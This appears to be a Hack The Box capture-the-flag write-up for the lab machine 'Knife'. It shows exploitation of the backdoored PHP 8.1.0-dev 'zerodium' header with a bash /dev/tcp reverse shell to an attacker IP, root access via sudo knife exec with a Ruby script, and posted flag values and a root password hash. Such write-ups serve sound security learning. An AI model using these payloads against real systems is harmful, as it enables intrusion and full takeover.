#Knife
Difficulty: Easy 	IP: 10.10.10.242

Saved the IP with domain as knife.htb in /etc/hosts.
Scanned the IP with rustscan and fot 22 and 80 open ports.
Got an entry point fron nikto scan: PHP 8.1.0-dev
Searched for its exploit and got it(https://github.com/fahmifj/php-zerodium-rce/blob/main/zerodiumRCE.py).

## User.txt

From this exploit, I ran:
```
python3 foothold.py http://knife.htb/
```

Got a shell as james. User.txt was in his home directory.


```
bbda296ff7e4f54843a3b7b49498f0c2
```

This was not a complete stable shell. To get a stable shell, I used this article(https://blog.csdn.net/qq_44159028/article/details/116992989).
Sent a request from browser to brupsuite and added a header to it.

```
User-Agentt: zerodiumsystem("bash -c 'exec bash -i /dev/tcp/10.10.14.28/4444 0>&1'");
```

And got a reverse shell as james.

## Root.txt

On running sudo -l, I came to know that we can run /usr/bin/knife as root.
When I ran it and saw help, I came to know how we can execute any command.

```
sudo /usr/bin/knife exec /path/to/ruby-script
```

I got the root.txt without actually getting root shell by creating a ruby script in local machine:

```
system('cat /root/root.txt')
```

Transfered it to target machine in james home directory.
Ran the script as:

```
sudo /usr/bin/knife exec ~/root.rb
```

```
a3aefe87f88ec3f8d683381c3af56f8d
```

## Root hash
```
$6$LCKz7Uz/FuWPPJ6o$LaOquetpLJIhOzr7YwJzFPX4NdDDHokHtUz.k4S1.CY7D/ECYVfP4Q5eS43/PMtsOa5up1ThgjB3.xUZsHyHA1
```